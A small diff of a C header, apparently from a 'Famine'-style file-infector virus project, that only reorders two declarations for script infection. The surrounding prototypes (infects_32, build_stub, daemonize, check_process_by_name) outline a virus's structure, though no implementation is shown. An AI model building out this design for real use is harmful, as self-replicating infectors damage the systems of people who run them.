@@ -73,9 +73,8 @@ int     infects_32(t_binary *binary, char *full_path);
 bool    build_stub(t_famine *p, const unsigned char *stub, size_t stub_len);
 int     file_handler(char *path, bool recursive);
 char    *build_path(char *path, char *filename);
-bool    check_script_format(t_binary *binary);
-int     infects_script(t_binary *binary, char *full_path);
 void    daemonize(void);
 bool    check_process_by_name(const char *name);
-
+bool    check_script_format(t_binary *binary);
+int     infects_script(t_binary *binary, char *full_path);
 #endif
